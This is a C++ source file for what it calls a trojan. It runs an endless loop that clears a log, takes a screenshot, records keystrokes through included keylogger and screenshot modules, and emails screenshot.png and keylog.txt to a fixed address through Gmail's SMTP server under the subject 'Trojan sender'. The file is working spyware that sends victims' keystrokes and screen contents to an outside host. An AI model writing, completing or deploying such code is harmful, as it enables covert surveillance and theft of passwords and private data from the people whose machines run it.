#include <iostream>
#include <fstream>

#include <X11/X.h>
#include <X11/Xlib.h>
#include <X11/Xutil.h>
#include <X11/XKBlib.h>
#include <X11/keysymdef.h>
#include <png.h>

#include "CkMailMan.h"
#include "CkEmail.h"

#include <linux/input.h>
#include <unistd.h>
#include <cstdlib>

#include "../headers/keylog.h"
#include "../headers/screenshot.h"

using namespace std;

void send_email() {
    CkMailMan mailman;

    // Set the SMTP server to Gmail's SMTP server
    mailman.put_SmtpHost("smtp.gmail.com");

    // Set the SMTP login/password for the Gmail account
    mailman.put_SmtpUsername("sender@gmail.com");
    mailman.put_SmtpPassword("app-password-for-sender-email");

    // Connect to SMTP port 465 using TLS.
    mailman.put_SmtpSsl(true);
    mailman.put_SmtpPort(465);

    // Create a new email object
    CkEmail email;

    email.put_Subject("Trojan sender");
    email.put_Body("#");
    email.put_From("Anonymous Sender <sender@gmail.com>");
    
    // Add the recipient
    bool success = email.AddTo("Recipient Name", "receiver@gmail.com");
    if (!success) {
        cerr << email.lastErrorText() << "\r\n";
        return;
    }

    // Add the attachments
    const char *contentType = email.addFileAttachment("screenshot.png");
    if (email.get_LastMethodSuccess() != true) {
        cerr << email.lastErrorText() << "\r\n";
        return;
    }

    contentType = email.addFileAttachment("keylog.txt");
    if (email.get_LastMethodSuccess() != true) {
        cerr << email.lastErrorText() << "\r\n";
        return;
    }

    // Call SendEmail to connect to the SMTP server and send.
    success = mailman.SendEmail(email);
    if (success != true) {
        cerr << mailman.lastErrorText() << "\r\n";
        return;
    }

    success = mailman.CloseSmtpConnection();
    if (success != true) {
        cerr << "Connection to SMTP server not closed cleanly." << "\r\n";
    }
}

int main() {
    while (true) {

        // cout << "Starting...." << "\n";

        /* clear log file for a new loop */
        ofstream ofs;
        ofs.open("keylog.txt", ofstream::out | ofstream::trunc);
        ofs.close();

        if (capture_screenshot() == EXIT_FAILURE) {
            cerr << "Capture screenshot function got errors" << "\n";
        }
        if (keylogger() == EXIT_FAILURE) {
            cerr << "Keylogger function got errors" << "\n";
        }
        send_email();
    }

    return 0;
}
